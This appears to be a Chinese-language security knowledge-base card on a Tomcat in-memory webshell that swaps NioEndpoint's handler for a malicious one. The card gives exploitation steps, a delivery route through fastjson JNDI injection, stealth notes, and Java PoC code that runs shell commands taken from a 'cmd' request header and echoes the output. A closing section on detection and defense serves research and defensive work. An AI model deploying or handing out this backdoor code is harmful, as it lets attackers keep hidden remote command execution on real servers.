---
id: web-java-component-tomcat-handler-memshell
title: Tomcat Handler 内存马：替换 NioEndpoint.handler，在 HTTP 解析前 read/unRead 窥探原始请求并 finishResponse 回显
type: scenario
domain: web
path: web/java/component/tomcat
technique: tomcat-endpoint-handler-memshell
tags:
- java
- tomcat
- memshell
- handler
- nio
- endpoint
- connector
- raw-socket
- reflection
- persistence
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V482
  verified_at: '2026-11-10T20:44:40+08:00'
  notes: '已对照原文与5张图核对：AbstractProtocol.ConnectionHandler→processor.process（图01）、NioEndpoint getHandler/setHandler（图02/03）、Http11InputBuffer.parseHeaders 解析点（图04）、Postman cmd: ipconfig 200 回显（图05）均一致；getNioEndpoint 反射链、wrapper.read(false,buf)+position(0)+unRead、setSocketWrapper、response.doWrite、finishResponse 刷新、fastjson 1.2.24 JdbcRowSetImpl 投递、8.0 以前 unRead 不适用等均与原文一致。dedup 将既有 Executor 内存马卡标 duplicate：二者同为 Connector 层预解析内存马但注入对象（AbstractEndpoint.handler vs NioEndpoint.executor）、取数（read/unRead vs socketBufferHandler.readBuffer）、回显（doWrite+finishResponse vs response.addHeader）不同，属不同 gadget，库内惯例按组件各成一卡且已互相链接，dedup_review 成立，保留并列。原文未标注 Tomcat 受影响版本（仅测试环境 JDK8/fastjson1.2.24），affected_versions 留空正确。未验证点：PoC 未在本机 Tomcat 复跑；NIO2/APR 变体未覆盖；frontmatter 无 sources/source_url。'
url: /docs/web/java/component/tomcat/web-java-component-tomcat-handler-memshell/
draft: false
kb_aliases:
- Tomcat Handler 内存马
- NioEndpoint.setHandler
- AbstractEndpoint.Handler 内存马
- 连接器 Handler 内存马
- 原始请求 read/unRead 内存马
- finishResponse 回显
---

## 一句话结论

在已能执行一次 Java 代码的 Tomcat NIO 中，反射定位 `NioEndpoint` 并把 `AbstractEndpoint.Handler` 替换为恶意 Handler；该 Handler 在 HTTP 请求尚未解析进 Coyote Request 之前，用 `SocketWrapperBase.read(false, buf)` 读出原始字节、再 `unRead(buf)` 放回输入流，识别自定义头 `cmd` 执行命令，并通过补 `setSocketWrapper` 后 `response.doWrite` + 反射调用 `finishResponse` 完成回显，形成比 Adapter/Executor 更靠前的 Connector 层内存马。

## 原理

- **注入点位置**：Tomcat 的连接器入口是 `AbstractProtocol.ConnectionHandler.process(wrapper, status)`，它按协议创建 Processor 并调用 `Processor.process`，再进入容器。`ConnectionHandler` 最终调用 Endpoint 的 `handler`（`AbstractEndpoint.Handler`）；`NioEndpoint` 持有该 `handler` 字段并提供 `getHandler/setHandler`，整体替换后所有连接事件都会先进入恶意 Handler。
- **为什么不能直接取请求头**：在 Handler 阶段，字节还停留在输入缓冲区，尚未执行 `Http11InputBuffer.parseHeaders()`（`if (!http09 && !inputBuffer.parseHeaders())` 才是解析点），因此 `processor.getRequest().getHeader("cmd")` 取不到任何 header，直接读 response 也会因未初始化/未刷新而异常。
- **读原始请求且不破坏正常流程**：`NioSocketWrapper.read(false, buf)` 把当前连接可读的字节读入 ByteBuffer，随后 `buf.position(0)` 并 `wrapper.unRead(buf)` 把数据放回输入流；这样恶意请求执行完可直接返回 `SocketState.CLOSED`，而正常请求仍能被原 handler 继续解析，业务无感知。
- **为什么不用 processor 的 inputBuffer**：从连接集合里拿当前 `processor`、再读 `Http11InputBuffer` 的 ByteBuffer，取到的往往是前一次（或前几次，取决于线程数）请求的缓存数据，第二三四次请求可能重复执行第一次的命令，不稳定；按线程轮询 request 也只能在“解析完成到请求结束”的窗口内取到数据。
- **回显条件**：`processor` 内部的 `wrapper` 在执行 Handler 阶段可能为 null，而 Coyote Response 写数据最终委托 wrapper；因此需要反射调用私有 `setSocketWrapper(wrapper)` 先补上，再 `processor.getRequest().getResponse().doWrite(ByteBuffer.wrap(result))`；写完后流未刷新，需要反射调用私有 `finishResponse()`，否则客户端收不到回显。随后返回 `SocketState.CLOSED` 结束该连接。
- **定位 NioEndpoint**：遍历当前线程组，找名字同时含 `Acceptor` 与 `http` 的线程，反射 `Thread.target` 取 `this$0`（或旧结构下的 `endpoint` 字段）；也可用 java-object-searcher 在内存中直接搜索 `NioEndpoint`。
- **注入与触发**：定义 `MyHandler implements AbstractEndpoint.Handler`，在静态代码块中保存原 handler、替换 endpoint 的 handler；示例通过 fastjson 1.2.24 `JdbcRowSetImpl` 的 JNDI LDAP reference 远程加载该类（JDK 8 测试环境）。之后访问任意路径，只要请求中带 `cmd` 标识就执行命令并回显，否则把请求交回原 `handler.process(wrapper, status)`。
- **版本差异**：Tomcat 8.0 以前直接用 `NioChannel.read(buf)` 获取数据流，没有 `SocketWrapperBase` 的封装与 unRead 回收机制（8.5 在 SocketWrapperBase 中手动实现了把已读数据放回后续 read buffer 的转换），因此 8.0 以前该 read/unRead 窥探方式可能不适用，只能用缓存实现，但会读到历史请求数据、不稳定；NIO2/APR 的 Endpoint/Processor 字段也不同。
- **隐蔽性**：没有新增 Servlet/Filter/Valve/UpgradeProtocol，替换的是 Endpoint 的 handler 对象，常规组件枚举看不到；拦截发生在协议解析之前，任意路径甚至不存在的 Context 也会命中；重启 Tomcat 后失效。

## 触发条件

- 目标为 NIO 的 Tomcat（`NioEndpoint`，具备 `SocketWrapperBase.read/unRead`，约 8.5 及以上），攻击者已获得一次 Java 代码执行能力（JSP、反序列化、表达式注入等）。
- 能反射访问 `ThreadGroup.threads`、`Thread.target`、`AbstractEndpoint.handler` 等字段（JDK 8 通常可行；JDK 17+ 强封装需额外绕过）。
- 目标存在活动连接，便于从连接集合取到当前 `processor` 用于回显（当前注入请求本身即可）。
- 攻击者能发送带自定义标识（如 `cmd` 头）的原始 HTTP 请求并读取响应体。

## 利用步骤

1. 遍历线程组，找名字含 `Acceptor` 且含 `http` 的线程，反射 `target` 后取 `this$0` 或 `endpoint`，得到 `NioEndpoint`；也可用对象搜索工具直接定位。
2. 保存 `handler = nioEndpoint.getHandler()`，实例化恶意 `MyHandler` 并 `nioEndpoint.setHandler(myHandler)`。
3. 在恶意 Handler 的 `process(SocketWrapperBase wrapper, SocketEvent status)` 中分配 8192 字节 ByteBuffer，调用 `wrapper.read(false, buf)` 读取当前连接数据，`buf.position(0)` 后 `wrapper.unRead(buf)` 放回。
4. 按 UTF-8 解析字节串，若包含标识 `cmd`，截取 `cmd` 之后到 `\r` 的命令并执行（Windows 用 `cmd.exe /c`，Linux 用 `/bin/sh -c`）；否则调用原 `handler.process(wrapper, status)` 交还容器。
5. 命中时从 `connections` 中取 `SocketWrapperBase.getCurrentProcessor()` 得到 Processor，反射调用 `setSocketWrapper(wrapper)`，用 `processor.getRequest().getResponse().doWrite(...)` 写回命令输出，再反射调用 `finishResponse()` 刷新流，返回 `SocketState.CLOSED`。
6. 通过任意代码执行入口加载并实例化 Handler 类（示例为 fastjson 1.2.24 + JNDI LDAP reference），随后发送带 `cmd` 头的请求验证回显。

## PoC

核心逻辑（精简，完整类需实现 `AbstractEndpoint.Handler` 的其余空方法）：

```java
// 1) 定位并替换 NioEndpoint.handler
NioEndpoint ep = (NioEndpoint) getNioEndpoint();   // Acceptor/http 线程 -> target -> this$0 或 endpoint
AbstractEndpoint.Handler orig = ep.getHandler();
ep.setHandler(new MyHandler());

// 2) 恶意 Handler 的 process：窥探原始请求并回显
public SocketState process(SocketWrapperBase wrapper, SocketEvent status) {
    ByteBuffer buf = ByteBuffer.wrap(new byte[8192]);
    try {
        wrapper.read(false, buf);
        buf.position(0);
        wrapper.unRead(buf);                        // 读后放回，正常请求仍可继续解析
        String raw = new String(buf.array(), "UTF-8");
        if (raw.indexOf("cmd") != -1) {
            String cmd = raw.substring(raw.indexOf("cmd") + 4,
                                       raw.indexOf("\r", raw.indexOf("cmd"))).trim();
            Method setSw = processor.getClass().getDeclaredMethod("setSocketWrapper", SocketWrapperBase.class);
            setSw.setAccessible(true);
            setSw.invoke(processor, wrapper);       // response 写数据依赖 wrapper
            processor.getRequest().getResponse().doWrite(ByteBuffer.wrap(exec(cmd)));
            Method finish = processor.getClass().getDeclaredMethod("finishResponse");
            finish.setAccessible(true);
            finish.invoke(processor);               // 刷新流，否则不回显
            return SocketState.CLOSED;
        }
    } catch (Exception e) {
        buf.position(0);
        wrapper.unRead(buf);
    }
    return orig.process(wrapper, status);           // 非恶意请求交还容器
}
```

`getNioEndpoint()` 的关键是遍历 `Thread.currentThread().getThreadGroup()` 的 `threads`，匹配线程名含 `Acceptor` 与 `http`，再反射 `target` 取 `this$0`/`endpoint`。

## 变体与关联

- **相邻 Connector 层注入点**：Handler（`AbstractEndpoint.Handler`，最靠前，请求未解析）＞ Executor（`NioEndpoint.executor`，SocketProcessor 调度处）＞ Adapter（`AbstractProcessor.adapter`，解析后进入容器前）。Handler 拿不到解析后的 request/response，必须自己读流并刷新；Adapter/Executor 有各自的取数与回显方式。
- **Tomcat 8.0 以前**：无 SocketWrapperBase/unRead 回收，只能缓存已读数据，可能重复执行历史请求中的命令，稳定性差；建议选择解析完成后的组件做内存马。
- **变体**：回显可改为反连或写文件；标识可换成任意 header、URI 片段或 body 关键字；命令输出可编码后放入响应体。
- 关联卡片：[[web-java-component-tomcat-adapter-memshell]]、[[web-java-component-tomcat-executor-memshell]]、[[web-java-component-tomcat-upgrade-memshell]]、[[web-java-component-tomcat-valve-memshell]]。

## 检测与防御

- **运行时**：检查 `NioEndpoint`/`AbstractEndpoint` 的 `handler` 字段实现类是否为 Tomcat 原始 `AbstractProtocol.ConnectionHandler`，出现自定义 Handler 即高置信告警；可用 arthas vmtool 枚举 endpoint 与 handler 对象。
- **类/字节码**：搜索实现 `AbstractEndpoint.Handler` 且包含 `SocketWrapperBase.read`/`unRead`、`setSocketWrapper`、`finishResponse` 反射调用的类；JSP 编译类中出现 `NioEndpoint`/`getHandler`/`setHandler` 反射链。
- **行为**：任意路径（含不存在 Context）带固定 header 即返回命令输出；请求未进入容器，正常访问日志缺失但响应存在；进程内出现无对应应用的动态类（JNDI 远程加载）。
- **防御**：修复任意代码执行入口；RASP/Java Agent 监控 `AbstractEndpoint.setHandler` 与自定义 Handler；限制 JNDI/LDAP 出网；重启可清除内存马，但不能清除入口，需同时排查持久化。
- **排查**：内存 dump/arthas 检查 `NioEndpoint.handler` 与实际类加载器；对比 Tomcat 原始类；检查 JNDI/LDAP 远程加载日志。
